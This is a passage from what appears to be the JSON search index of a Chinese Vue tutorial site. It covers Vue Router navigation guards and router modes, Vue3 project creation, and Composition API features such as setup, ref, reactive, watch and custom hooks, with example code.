Home, meta: { title: '主页' }, children: [ //通过children配置子级路由 { // path: 'news' // 简化写法，此处一定不要带斜杠 path: '/home/news', //完整写法 name: 'xinwen', //给路由命名 component: News, meta: { isAuth: true, title: '新闻' }, }, { path: 'message', // 简化写法 component: Message, meta: { isAuth: true, title: '消息' }, children: [ { path: 'detail', //使用占位符声明接收params参数 name: 'xiangqing', //命名路由 component: Detail, meta: { title: '详情' }, //第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件 // props:{a:900} //第二种写法：props值为布尔值，为true时，则把路由收到的所有params参数通过props传给Detail组件 // props:true //第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件 props($route) { return { id: $route.query.id, title: $route.query.title, } }, }, ], }, ], }, ], }) //全局前置路由守卫：初始化时、每次路由切换前执行 router.beforeEach((to, from, next) => { // 判断当前路由是否需要进行权限控制,这里的meta表示路由元信息 if (to.meta.isAuth) { // 权限控制的具体规则 if (localStorage.getItem('school') === 'QFNU') { next() // 放行 } else { alert('暂无权限查看') } } else { next() // 放行 } }) // 全局后置守卫：初始化时、每次路由切换后执行 router.afterEach((to, from) => { if (to.meta.title) { document.title = to.meta.title //修改网页的title } else { document.title = 'Vue' } }) //暴露router export default router \",\"效果：\",\"VueRouter08.gif\"]},{\"header\":\"11.2 独享路由守卫\",\"slug\":\"_11-2-独享路由守卫\",\"contents\":[\"例：我们给上述案例添加独享路由守卫，当 localStorage 中 school 为 QFNU 时才可以访问新闻界面\",\"我们给新闻的路由配置添加独享路由守卫即可（可以配合全局后置路由守卫）\",\"src/router/index.js\",\"import VueRouter from 'vue-router' // 引入VueRouter import About from '../pages/About' // 路由组件 import Home from '../pages/Home' // 路由组件 import News from '../pages/News' // 路由组件 import Message from '../pages/Message' // 路由组件 import Detail from '../pages/Detail' // 路由组件 // 创建router实例对象，去管理一组一组的路由规则 const router = new VueRouter({ routes: [ { path: '/about', component: About, meta: { title: '关于' }, }, { path: '/home', component: Home, meta: { title: '主页' }, children: [ //通过children配置子级路由 { // path: 'news' // 简化写法，此处一定不要带斜杠 path: '/home/news', //完整写法 name: 'xinwen', //给路由命名 component: News, meta: { isAuth: true, title: '新闻' }, beforeEnter(to, from, next) { console.log('beforeEnter', to, from) if (localStorage.getItem('school') === 'QFNU') { next() } else { alert('暂无权限查看') } }, }, { path: 'message', // 简化写法 component: Message, meta: { isAuth: true, title: '消息' }, children: [ { path: 'detail', //使用占位符声明接收params参数 name: 'xiangqing', //命名路由 component: Detail, meta: { title: '详情' }, //第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件 // props:{a:900} //第二种写法：props值为布尔值，为true时，则把路由收到的所有params参数通过props传给Detail组件 // props:true //第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件 props($route) { return { id: $route.query.id, title: $route.query.title, } }, }, ], }, ], }, ], }) // 全局后置守卫：初始化时、每次路由切换后执行 router.afterEach((to, from) => { if (to.meta.title) { document.title = to.meta.title //修改网页的title } else { document.title = 'Vue' } }) //暴露router export default router \"]},{\"header\":\"11.3 组件内路由守卫\",\"slug\":\"_11-3-组件内路由守卫\",\"contents\":[\"//进入守卫：通过路由规则，进入该组件时被调用 beforeRouteEnter (to, from, next) {... next()}, //离开守卫：通过路由规则，离开该组件时被调用 beforeRouteLeave (to, from, next) {... next()}, \",\"例：我们将上述案例中其它的路由守卫配置删除，给 About 组件添加组件内路由守卫\",\"src/pages/About.vue\",\"<template> <h2>我是About的内容</h2> </template> <script> export default { name: 'About', // 通过路由规则，进入该组件时被调用 beforeRouteEnter(to, from, next) { console.log('About--beforeRouteEnter', to, from) if (localStorage.getItem('school') === 'QFNU') { next() } else { alert('学校名不对，无权限查看！') } }, // 通过路由规则，离开该组件时被调用 beforeRouteLeave(to, from, next) { console.log('About--beforeRouteLeave', to, from) next() } } </script> \",\"效果：\",\"VueRouter09.gif\"]},{\"header\":\"12. 路由器的两种工作模式\",\"slug\":\"_12-路由器的两种工作模式\",\"contents\":[\"对于一个 url 来说，什么是 hash 值：# 及其后面的内容就是 hash 值\",\"hash 值不会包含在 HTTP 请求中，即：hash 值不会带给服务器\",\"hash 模式：\",\"地址中永远带着 # 号，不美观\",\"若以后将地址通过第三方手机 app 分享，若 app 校验严格，则地址会被标记为不合法\",\"兼容性较好\",\"history 模式：\",\"地址干净，美观\",\"兼容性和 hash 模式相比略差\",\"应用部署上线时需要后端人员支持，解决刷新页面服务端 404 的问题\",\"const router = new VueRouter({ mode:'history', routes:[...] }) export default router \"]}]},\"/front-end/vue-notes/24-Vue3%E7%AE%80%E4%BB%8B.html\":{\"title\":\"Vue3简介\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"2020年9月18日，Vue. js 发布3.0版本，代号：One Piece（海贼王）\"]},{\"header\":\"1. Vue3带来了什么\",\"slug\":\"_1-vue3带来了什么\",\"contents\":[]},{\"header\":\"1.1 性能的提升\",\"slug\":\"_1-1-性能的提升\",\"contents\":[\"打包大小减少 41%\",\"初次渲染快 55%, 更新渲染快 133%\",\"内存减少 54%\",\"......\"]},{\"header\":\"1.2 源码的升级\",\"slug\":\"_1-2-源码的升级\",\"contents\":[\"使用 Proxy 代替 defineProperty 实现响应式\",\"重写虚拟 DOM 的实现和 Tree-Shaking\",\"......\"]},{\"header\":\"1.3 拥抱TypeScript\",\"slug\":\"_1-3-拥抱typescript\",\"contents\":[\"Vue 3 可以更好的支持 TypeScript\"]},{\"header\":\"1.4 新的特性\",\"slug\":\"_1-4-新的特性\",\"contents\":[\"Composition API（组合 API） \",\"setup 配置\",\"ref 与 reactive\",\"watch 与 watchEffect\",\"provide 与 inject\",\"......\",\"新的内置组件 \",\"Fragment\",\"Teleport\",\"Suspense\",\"其他改变 \",\"新的生命周期钩子\",\"data 选项应始终被声明为一个函数\",\"移除 keyCode 支持作为 v-on 的修饰符\",\"......\"]}]},\"/front-end/vue-notes/25-%E5%88%9B%E5%BB%BAVue3%E9%A1%B9%E7%9B%AE.html\":{\"title\":\"创建Vue3项目\",\"contents\":[{\"header\":\"1. 使用vue-cli创建\",\"slug\":\"_1-使用vue-cli创建\",\"contents\":[\"## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上 vue --version ## 安装或者升级你的@vue/cli npm install -g @vue/cli ## 创建Vue项目，选择Vue3 vue create xxx \"]},{\"header\":\"2. 使用create-vue创建\",\"slug\":\"_2-使用create-vue创建\",\"contents\":[\"npm create vue@latest \",\"create-vue基于vite\",\"vite 官网：Vite中文网\",\"什么是 vite？—— 新一代前端构建工具\",\"优势如下：\",\"开发环境中，无需打包操作，可快速的冷启动\",\"轻量快速的热重载（HMR）\",\"真正的按需编译，不再等待整个应用编译完成\",\"传统构建与 vite 构建对比图\",\"创建Vue3项目01.png\",\"传统构建模式是将所有资源都打包好，再上线\",\"创建Vue3项目02.png\",\"Vite 有点按需加载的意思\"]},{\"header\":\"3. 对比Vue2的项目文件目录\",\"slug\":\"_3-对比vue2的项目文件目录\",\"contents\":[]},{\"header\":\"3.1 main.js\",\"slug\":\"_3-1-main-js\",\"contents\":[\"Vue2 项目的 main.js：\",\"import Vue from 'vue' import App from './App.vue' Vue.config.productionTip = false new Vue({ render: h => h(App), }).$mount('#app') \",\"Vue3 项目的 main.js：\",\"import { createApp } from 'vue' import App from './App.vue' createApp(App).mount('#app') \",\"分析可知：\",\"// 引入的不再是Vue构造函数了，引入的是一个名为createApp的工厂函数 import { createApp } from 'vue' import App from './App.vue' // 创建应用实例对象——app(类似于之前Vue2中的vm，但app比vm更“轻”) const app = createApp(App) // 挂载 app.mount('#app') \"]},{\"header\":\"3.2 App.vue\",\"slug\":\"_3-2-app-vue\",\"contents\":[\"在 template 标签里可以没有根标签了\",\"<template> <!-- Vue3组件中的模板结构可以没有根标签 --> <img alt=\\\"Vue logo\\\" src=\\\"./assets/logo.png\\\"> <HelloWorld msg=\\\"Welcome to Your Vue.js App\\\"/> </template> \"]}]},\"/front-end/vue-notes/26-Vue3CompositionAPI.html\":{\"title\":\"Vue3CompositionAPI\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"在 Vue2 中，我们使用 Options API，选项式的 API，我们要创建一个 Vue实例，然后在里面传入一个配置对象，里面要写 data、methods、watch 等的东西，而 Vue3提出了全新的 Composition API，组合式API，我们不用直接创建 Vue 实例，而是创建一个 app，然后按需引入需要的 API来进行使用\"]},{\"header\":\"1. Options API存在的问题\",\"slug\":\"_1-options-api存在的问题\",\"contents\":[\"使用传统 Options API（选项式 API）中，新增或者修改一个需求，就需要分别在 data，methods，computed 里修改\",\"Vue3CompositionAPI01.gif\",\"Vue3CompositionAPI02.gif\"]},{\"header\":\"2. Composition API的优势\",\"slug\":\"_2-composition-api的优势\",\"contents\":[\"我们可以更加优雅的组织我们的代码、函数。让相关功能的代码更加有序的组织在一起\",\"Vue3CompositionAPI03.gif\",\"Vue3CompositionAPI04.gif\"]},{\"header\":\"3. 常用的Composition API\",\"slug\":\"_3-常用的composition-api\",\"contents\":[]},{\"header\":\"3.1 拉开序幕的setup\",\"slug\":\"_3-1-拉开序幕的setup\",\"contents\":[\"理解：Vue 3.0 中一个新的配置项，值为一个函数\",\"setup 是所有Composition API（组合式 API）“表演的舞台”\",\"组件中所用到的：数据、方法等等，均要配置在 setup 中\",\"setup 函数的两种返回值： \",\"若返回一个对象，则对象中的属性、方法，在模板中均可以直接使用（重点关注！）\",\"若返回一个渲染函数：则可以自定义渲染内容（了解）\",\"注意点： \",\"尽量不要与 Vue 2. x 配置混用 \",\"Vue 2. x 配置（data、methos、computed...）中可以访问到setup中的属性、方法\",\"但在 setup 中不能访问到Vue 2. x 配置（data、methos、computed...）\",\"如果有重名, setup 优先\",\"setup 不能是一个 async 函数，因为返回值不再是 return 的对象, 而是 promise, 模板看不到 return 对象中的属性（后期也可以返回一个 Promise 实例，但需要 Suspense 和异步组件的配合）\",\"代码演示：\",\"<template> <h1>博主的信息</h1> <h2>姓名：{{name}}</h2> <h2>年龄：{{age}}</h2> <h2>性别：{{gender}}</h2> <button @click=\\\"sayInfo\\\">显示信息</button> </template> <script> export default { name: \\\"App\\\", //此处只是测试一下setup，暂时不考虑响应式的问题 setup(){ // 数据 let name = \\\"zhf\\\" let age = 18 let gender = \\\"男\\\" // 方法 function sayInfo(){ alert(`你好${name}，你太厉害了吧`) } return { name,age, gender,sayInfo } } } </script> \",\"效果：\",\"Vue3CompositionAPI05.gif\",\"如果返回的是渲染函数，那么你在 template 里写的模板都不奏效了，页面渲染的就是你写的 h 函数里面的内容\",\"<template> <h1>博主的信息</h1> <h2>姓名：{{ name }}</h2> <h2>年龄：{{ age }}</h2> <h2>性别：{{ gender }}</h2> <button @click=\\\"showInfo\\\">显示信息</button> </template> <script> import { h } from 'vue' export default { name: \\\"App\\\", //此处只是测试一下setup，暂时不考虑响应式的问题 setup() { // 数据 let name = \\\"zhf\\\" let age = 18 let gender = \\\"男\\\" // 方法 function showInfo() { alert(`你好${name}!`) } // return { // name, age, gender, showInfo // } return () => h('h1', 'zhfyyds') } } </script> \",\"效果：\",\"Vue3CompositionAPI06.png\",\"上面我们使用setup函数定义并暴露出去，这种方式会非常繁琐，我们还可以使用构建工具，<script setup>能自动暴露，简化操作（见后面简化操作）\",\"<template> </template> <script setup> </script> \"]},{\"header\":\"3.2 ref函数\",\"slug\":\"_3-2-ref函数\",\"contents\":[\"作用: 定义一个响应式的数据\",\"语法: const xxx = ref(initValue)\",\"创建一个包含响应式数据的引用对象（reference 对象，简称 ref 对象）\",\"JS 中操作数据： xxx.value\",\"模板中读取数据: 不需要.value，直接：<div>{{xxx}}</div>\",\"备注：\",\"接收的数据可以是基本类型也可以是对象类型\",\"基本类型的数据：响应式依然是靠 Object.defineProperty() 的 get 与 set 完成的\",\"对象类型的数据：内部“求助”了 Vue 3.0 中的一个新函数—— reactive 函数\",\"代码演示：\",\"<template> <h1>博主的信息</h1> <h2>姓名：{{ name }}</h2> <h2>年龄：{{ age }}</h2> <h2>职业： {{ job.type }}</h2> <h2>工资：{{ job.salary }}</h2> <button @click=\\\"sayInfo\\\">显示信息</button> <button @click=\\\"changeInfo\\\">修改信息</button> </template> <script> import { ref } from \\\"vue\\\" export default { name: \\\"App\\\", setup() { // 数据 let name = ref(\\\"zhf\\\") let age = ref(18) let job = ref({ type: \\\"前端工程师\\\", salary: \\\"30K\\\", }) // 方法 function sayInfo() { alert(`你好${name.value}，你太厉害了吧，薪水${job.value.salary}这么高`) } function changeInfo() { name.value = \\\"三十年后的zhf\\\" age.value = 48; job.value.type = \\\"工程师\\\" job.value.salary = \\\"200K\\\" } return { name, age, job, sayInfo, changeInfo, } }, } </script> \",\"效果：\",\"Vue3CompositionAPI07.gif\",\"简化写法：\",\"<template> <h1>博主的信息</h1> <h2>姓名：{{ name }}</h2> <h2>年龄：{{ age }}</h2> <h2>职业： {{ job.type }}</h2> <h2>工资：{{ job.salary }}</h2> <button @click=\\\"sayInfo\\\">显示信息</button> <button @click=\\\"changeInfo\\\">修改信息</button> </template> <script setup> import { ref } from \\\"vue\\\" // 数据 let name = ref(\\\"zhf\\\") let age = ref(18) let job = ref({ type: \\\"前端工程师\\\", salary: \\\"30K\\\", }) // 方法 function sayInfo() { alert(`你好${name.value}，你太厉害了吧，薪水${job.value.salary}这么高`) } function changeInfo() { name.value = \\\"三十年后的zhf\\\" age.value = 48; job.value.type = \\\"工程师\\\" job.value.salary = \\\"200K\\\" } </script> \",\"通过看源码可以知道调用 ref 会返回一个 RefImpl 的实例对象，RefImpl 类中有 getter 和 setter 可以检测到数据的变化\"]},{\"header\":\"3.3 reactive函数\",\"slug\":\"_3-3-reactive函数\",\"contents\":[\"作用: 定义一个对象类型的响应式数据（基本类型不要用它，要用 ref 函数）\",\"语法：const 代理对象= reactive(源对象) 接收一个对象（或数组），返回一个代理对象（Proxy 的实例对象，简称 proxy 对象）\",\"reactive 定义的响应式数据是“深层次的”\",\"内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作\",\"代码演示：\",\"<template> <h1>博主的信息</h1> <h2>姓名：{{ person.name }}</h2> <h2>年龄：{{ person.age }}</h2> <h2>职业： {{ person.job.type }}</h2> <h2>工资：{{ person.job.salary }}</h2> <h2>爱好：{{ person.hobby }}</h2> <h3>测试数据：{{ person.job.a.b.c }}</h3> <button @click=\\\"changeInfo\\\">修改信息</button> </template> <script> import { reactive } from \\\"vue\\\" export default { name: \\\"App\\\", setup() { // 数据 let person = reactive({ name: \\\"zhf\\\", age: 18, hobby: [\\\"写博客\\\", \\\"学习\\\", \\\"看书\\\"], job: { type: \\\"前端工程师\\\", salary: \\\"30K\\\", a: { b: { c: 666, }, }, }, }) // 方法 function changeInfo() { person.name = \\\"三十年后的zhf\\\" person.age = 48 person.job.type = \\\"工程师\\\" person.job.salary = \\\"200K\\\" person.job.a.b.c = 888 // 直接通过数组下标修改，可以触发响应式 person.hobby[0] = \\\"写小说\\\" } return { person, changeInfo, } }, } </script> \",\"效果：\",\"Vue3CompositionAPI08.gif\"]},{\"header\":\"3.4 Vue3.0中的响应式原理\",\"slug\":\"_3-4-vue3-0中的响应式原理\",\"contents\":[]},{\"header\":\"3.4.1 vue2.x的响应式\",\"slug\":\"_3-4-1-vue2-x的响应式\",\"contents\":[\"实现原理：\",\"对象类型：通过 Object.defineProperty() 对属性的读取、修改进行拦截（数据劫持）\",\"数组类型：通过重写更新数组的一系列方法来实现拦截（对数组的变更方法进行了包裹）\",\"Object.defineProperty(data, 'count', { get () {}, set () {} }) \",\"存在问题：\",\"新增属性、删除属性，界面不会更新\",\"直接通过下标修改数组，界面不会自动更新\",\"解决方案：\",\"使用 Vue.set 、Vue.delete 或者 vm.$set、vm.$delete 这些 API\",\"模拟 Vue2 中实现响应式\",\"//源数据 let person = { name:'张三', age:18 } //模拟Vue2中实现响应式 let p = {} Object.defineProperty(p,'name',{ configurable:true, get(){ //有人读取name时调用 return person.name }, set(value){ //有人修改name时调用 console.log('有人修改了name属性，我发现了，我要去更新界面！') person.name = value } }) Object.defineProperty(p,'age',{ get(){ //有人读取age时调用 return person.age }, set(value){ //有人修改age时调用 console.log('有人修改了age属性，我发现了，我要去更新界面！') person.age = value } }) \"]},{\"header\":\"3.4.2 Vue3.0的响应式\",\"slug\":\"_3-4-2-vue3-0的响应式\",\"contents\":[\"实现原理:\",\"通过 Proxy（代理）: 拦截对象中任意属性的变化，包括：属性值的读写、属性的添加、属性的删除等\",\"通过 Reflect（反射）: 对源对象的属性进行操作\",\"MDN 文档中描述的 Proxy 与 Reflect： \",\"Proxy：Proxy\",\"Reflect：Reflect\",\"new Proxy(data, { // 拦截读取属性值 get (target, prop) { return Reflect.get(target, prop) }, // 拦截设置属性值或添加新属性 set (target, prop, value) { return Reflect.set(target, prop, value) }, // 拦截删除属性 deleteProperty (target, prop) { return Reflect.deleteProperty(target, prop) } }) proxy.name = 'tom' \"]},{\"header\":\"3.5 reactive对比ref\",\"slug\":\"_3-5-reactive对比ref\",\"contents\":[\"从定义数据角度对比：\",\"ref 用来定义基本类型数据\",\"reactive 用来定义对象（或数组）类型数据\",\"备注：ref 也可以用来定义对象（或数组）类型数据, 它内部会自动通过 reactive 转为代理对象\",\"从原理角度对比：\",\"ref 通过 Object.defineProperty() 的 get 与 set 来实现响应式（数据劫持）\",\"reactive 通过使用Proxy来实现响应式（数据劫持）, 并通过Reflect操作源对象内部的数据\",\"从使用角度对比：\",\"ref 定义的数据：操作数据需要 .value，读取数据时模板中直接读取不需要.value\",\"reactive 定义的数据：操作数据与读取数据均不需要 .value\"]},{\"header\":\"3.6 setup的两个注意点\",\"slug\":\"_3-6-setup的两个注意点\",\"contents\":[\"setup 执行的时机\",\"在 beforeCreate 之前执行一次，this 是 undefined\",\"setup 的参数\",\"props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性\",\"context：上下文对象 \",\"attrs: 值为对象，包含：组件外部传递过来，但没有在 props 配置中声明的属性, 相当于 this.$attrs\",\"slots: 收到的插槽内容, 相当于 this.$slots\",\"emit: 分发自定义事件的函数, 相当于 this.$emit\",\"例：\",\"APP 组件和 HelloWorld 组件\",\"父组件向子组件传递属性参数\",\"App.vue\",\"<template> <h1>博主的信息</h1> <HelloWorld msg=\\\"你好啊\\\" school=\\\"ABC\\\"></HelloWorld> </template> <script> import HelloWorld from \\\"./components/HelloWorld.vue\\\" export default { name: \\\"App\\\", components: { HelloWorld }, } </script> <style></style> \",\"HelloWorld.vue\",\"<template> <h2>姓名：{{ person.name }}</h2> </template> <script> import { reactive } from \\\"vue\\\" export default { name: \\\"HelloWorld\\\", props: ['msg'], // 不写全会报警告 setup(props, context) { let person = reactive({ name: \\\"zhf\\\", }); console.log('props-----', props) console.log() console.log('context.attrs-----', context.attrs) return { person } }, } </script> \",\"效果：\",\"Vue3CompositionAPI09.png\",\"自定义事件\",\"App.vue\",\"<template> <h1>博主的信息</h1> <HelloWorld @hello=\\\"showHelloMsg\\\"></HelloWorld> </template> <script> import HelloWorld from \\\"./components/HelloWorld.vue\\\" export default { name: \\\"App\\\", components: { HelloWorld }, setup() { function showHelloMsg(value) { alert(`你好啊，你触发了hello事件，我收到的参数是:${value}！`) } return { showHelloMsg } }, } </script> \",\"HelloWorld.vue\",\"<template> <h2>姓名：{{ person.name }}</h2> <button @click=\\\"test\\\">测试触发一下HelloWorld组件的Hello事件</button> </template> <script> import { reactive } from \\\"vue\\\" export default { name: \\\"HelloWorld\\\", emits: [\\\"hello\\\"], // 不写能执行，但是会报警告 setup(props, context) { let person = reactive({ name: \\\"zhf\\\", }) function test() { context.emit(\\\"hello\\\", \\\"**子组件的信息**\\\") } return { person, test } }, } </script> \",\"结果：\",\"Vue3CompositionAPI10.gif\",\"插槽\",\"默认插槽\",\"<template> <h1>博主的信息</h1> <HelloWorld> <span>zhf，你好</span> </HelloWorld> </template> \",\"<template> <h2>姓名：{{ person.name }}</h2> <slot></slot> </template> \",\"具名插槽\",\"<template> <h1>博主的信息</h1> <HelloWorld> <template v-slot:personMsg> <span>zhf，你好</span> </template> </HelloWorld> </template> \",\"<template> <h2>姓名：{{ person.name }}</h2> <slot name=\\\"personMsg\\\"></slot> </template> \"]},{\"header\":\"3.7 计算属性与监视\",\"slug\":\"_3-7-计算属性与监视\",\"contents\":[]},{\"header\":\"3.7.1 computed函数\",\"slug\":\"_3-7-1-computed函数\",\"contents\":[\"与 Vue2.x 中 computed 配置功能一致\",\"写法：\",\"import {computed} from 'vue' setup(){ ... //计算属性——简写 let fullName = computed(()=>{ return person.firstName + '-' + person.lastName }) //计算属性——完整 let fullName = computed({ get(){ return person.firstName + '-' + person.lastName }, set(value){ const nameArr = value.split('-') person.firstName = nameArr[0] person.lastName = nameArr[1] } }) } \"]},{\"header\":\"3.7.2 watch函数\",\"slug\":\"_3-7-2-watch函数\",\"contents\":[\"与 Vue2.x 中 watch 配置功能一致\",\"两个小“坑”：\",\"监视 reactive 定义的响应式数据时：oldValue 无法正确获取、强制开启了深度监视（deep 配置失效）\",\"监视 reactive 定义的响应式数据中某个属性时：deep 配置有效\",\"//情况一：监视ref定义的响应式数据 watch(sum,(newValue,oldValue)=>{ console.log('sum变化了',newValue,oldValue) },{immediate:true}) //情况二：监视多个ref定义的响应式数据 watch([sum,msg],(newValue,oldValue)=>{ console.log('sum或msg变化了',newValue,oldValue) }) /* 情况三：监视reactive定义的响应式数据 若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！ 若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 */ watch(person,(newValue,oldValue)=>{ console.log('person变化了',newValue,oldValue) },{immediate:true,deep:false}) //此处的deep配置不再奏效 //情况四：监视reactive定义的响应式数据中的某个属性 watch(()=>person.job,(newValue,oldValue)=>{ console.log('person的job变化了',newValue,oldValue) },{immediate:true,deep:true}) //情况五：监视reactive定义的响应式数据中的某些属性 watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{ console.log('person的job变化了',newValue,oldValue) },{immediate:true,deep:true}) //特殊情况 watch(()=>person.job,(newValue,oldValue)=>{ console.log('person的job变化了',newValue,oldValue) },{deep:true}) //此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效 \"]},{\"header\":\"3.7.3 watchEffect函数\",\"slug\":\"_3-7-3-watcheffect函数\",\"contents\":[\"watch 的套路是：既要指明监视的属性，也要指明监视的回调\",\"watchEffect 的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性\",\"watchEffect 有点像 computed：\",\"但 computed 注重的计算出来的值（回调函数的返回值），所以必须要写返回值\",\"而 watchEffect 更注重的是过程（回调函数的函数体），所以不用写返回值\",\"//watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。 watchEffect(()=>{ const x1 = sum.value const x2 = person.age console.log('watchEffect配置的回调执行了') }) \"]},{\"header\":\"3.8 生命周期\",\"slug\":\"_3-8-生命周期\",\"contents\":[\"Vue3CompositionAPI11.png\",\"Vue3.0 中可以继续使用 Vue2. x 中的生命周期钩子，但有有两个被更名：\",\"beforeDestroy 改名为 beforeUnmount\",\"destroyed 改名为 unmounted\",\"Vue3.0 也提供了 Composition API 形式的生命周期钩子，与 Vue2.x 中钩子对应关系如下：\",\"beforeCreate ===> setup()\",\"created ===> setup()\",\"beforeMount ===> onBeforeMount\",\"mounted ===> onMounted\",\"beforeUpdate ===> onBeforeUpdate\",\"updated ===> onUpdated\",\"beforeUnmount ===> onBeforeUnmount\",\"unmounted ===> onUnmounted\",\"可以直接以配置项的形式使用生命周期钩子，也可以使用组合式 API 的形式使用，尽量统一\",\"一般来说，组合式 API 里的钩子会比配置项的钩子先执行\"]},{\"header\":\"3.9 自定义hook函数\",\"slug\":\"_3-9-自定义hook函数\",\"contents\":[\"什么是 hook？—— 本质是一个函数，把 setup 函数中使用的 Composition API 进行了封装，类似于 vue2.x 中的 mixin\",\"自定义 hook 的优势：复用代码, 让 setup 中的逻辑更清楚易懂\",\"例： 创建一个 hooks 文件夹，里面创建 usePoint.js\",\"import { reactive, onMounted, onBeforeUnmount } from \\\"vue\\\" export default function() { //实现鼠标“打点”相关的数据 let point = reactive({ x: 0, y: 0, }) //实现鼠标“打点”相关的方法 function savePoint(event) { point.x = event.pageX point.y = event.pageY console.log(event.pageX, event.pageY) } //实现鼠标“打点”相关的生命周期钩子 onMounted(() => { window.addEventListener(\\\"click\\\", savePoint) }) onBeforeUnmount(() => { window.removeEventListener(\\\"click\\\", savePoint) }) return point } \",\"在组件中使用：\",\"<template> <h2>我是Demo组件</h2> <h2>当前点击时鼠标的坐标为：x：{{point.x}}，y：{{point.y}}</h2> </template> <script> import usePoint from '../hooks/usePoint' export default { name:'Demo', setup(){ const point = usePoint() return {point} } } </script> \"]},{\"header\":\"3.10 toRef\",\"slug\":\"_3-10-toref\",\"contents\":[\"作用：创建一个 ref 对象，其 value 值指向另一个对象中的某个属性\",\"语法：const name = toRef(person,'name')\",\"应用: 要将响应式对象中的某个属性单独提供给外部使用时\",\"扩展：toRefs 与 toRef 功能一致，但可以批量创建多个 ref 对象，语法：toRefs(person)\",\"例：\",\"<template> <h4>{{person}}</h4> <h2>姓名：{{name}}</h2> <h2>年龄：{{age}}</h2> <h2>薪资：{{job.j1.salary}}K</h2> <button @click=\\\"name+='~'\\\">修改姓名</button> <button @click=\\\"age++\\\">增长年龄</button> <button @click=\\\"job.j1.salary++\\\">涨薪</button> </template> <script> import {ref,reactive,toRef,toRefs} from 'vue' export default { name: 'Demo', setup(){ //数据 let person = reactive({ name:'张三', age:18, job:{ j1:{ salary:20 } } }) // const name1 = person.name // console.log('%%%',name1) // const name2 = toRef(person,'name') // console.log('####',name2) // const x = toRefs(person) // console.log('******',x) return { person, // name:toRef(person,'name'), // age:toRef(person,'age'), // salary:toRef(person.job.j1,'salary'), ...toRefs(person) } } } </script> \"]},{\"header\":\"4. 其它Composition API\",\"slug\":\"_4-其它composition-api\",\"contents\":[]},{\"header\":\"4.1 shallowReactive与shallowRef\",\"slug\":\"_4-1-shallowreactive与shallowref\",\"contents\":[\"shallowReactive：只处理对象最外层属性的响应式（浅响应式）\",\"shallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理\",\"什么时候使用?\",\"如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===> shallowReactive\",\"如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换 ===> shallowRef\"]},{\"header\":\"4.2 readonly与shallowReadonly\",\"slug\":\"_4-2-readonly与shallowreadonly\",\"contents\":[\"readonly: 让一个响应式数据变为只读的（深只读）\",\"shallowReadonly：让一个响应式数据变为只读的（浅只读）\",\"应用场景: 不希望数据被修改时\"]},{\"header\":\"4.3 toRaw与markRaw\",\"slug\":\"_4-3-toraw与markraw\",\"contents\":[\"toRaw：\",\"作用：将一个由 reactive 生成的响应式对象转为普通对象\",\"使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新\",\"markRaw：\",\"作用：标记一个对象，使其永远不会再成为响应式对象\",\"应用场景: \",\"有些值不应被设置为响应式的，例如复杂的第三方类库等\",\"当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能\"]},{\"header\":\"4.4 customRef\",\"slug\":\"_4-4-customref\",\"contents\":[\"作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制\",\"实现防抖效果：\",\"<template> <input type=\\\"text\\\" v-model=\\\"keyword\\\"> <h3>{{keyword}}</h3> </template> <script> import {ref,customRef} from 'vue' export default { name:'Demo', setup(){ //自定义一个myRef function myRef(value,delay){ let timer //通过customRef去实现自定义 return customRef((track,trigger)=>{ return{ get(){ track() //告诉Vue这个value值是需要被“追踪”的,通知Vue追踪value的变化（提前和get商量一下，让他认为这个value是有用的） return value }, set(newValue){ clearTimeout(timer) timer = setTimeout(()=>{ value = newValue trigger() //告诉Vue去更新界面，通知Vue去重新解析模板 },delay) } } }) } let keyword = myRef('hello',500) //使用程序员自定义的ref return { keyword } } } </script> \"]},{\"header\":\"4.5 provide与inject\",\"slug\":\"_4-5-provide与inject\",\"contents\":[\"Vue3CompositionAPI12.png\",\"作用：实现祖与后代组件间通信\",\"套路：父组件有一个 provide 选项来提供数据，后代组件有一个 inject 选项来开始使用这些数据\",\"具体写法：\",\"祖组件中：\",\"setup(){ ...... let car = reactive({name:'奔驰',price:'40万'}) provide('car',car)//给自己的后代组件传递数据 ...... } \",\"后代组件中：\",\"setup(props,context){ ...... const car = inject('car')//拿到祖先的数据 return {car} ...... } \"]},{\"header\":\"4.6 响应式数据的判断\",\"slug\":\"_4-6-响应式数据的判断\",\"contents\":[\"isRef: 检查一个值是否为一个 ref 对象\",\"isReactive: 检查一个对象是否是由 reactive 创建的响应式代理\",\"isReadonly: 检查一个对象是否是由 readonly 创建的只读代理\",\"isProxy: 检查一个对象是否是由 reactive 或者 readonly 方法创建的代理\"]}]},\"/front-end/vue-notes/27-Vue3%E6%96%B0%E7%9A%84%E7%BB%84%E4%BB%B6.html\":{\"title\":\"Vue3新的组件\",\"contents\":[{\"header\":\"1. Fragment\",\"slug\":\"_1-fragment\",\"contents\":[\"在 Vue2 中: 组件必须有一个根标签\",\"在 Vue3 中: 组件可以没有根标签, 内部会将多个标签包含在一个 Fragment 虚拟元素中\",\"好处: 减少标签层级, 减小内存占用\"]},{\"header\":\"2. Teleport\",\"slug\":\"_2-teleport\",\"contents\":[\"什么是 Teleport？—— Teleport 是一种能够将我们的组件 HTML 结构移动到指定位置的技术\",\"<teleport to=\\\"移动位置\\\"> <div v-if=\\\"isShow\\\" class=\\\"mask\\\"> <div class=\\\"dialog\\\"> <h3>我是一个弹窗</h3> <button @click=\\\"isShow = 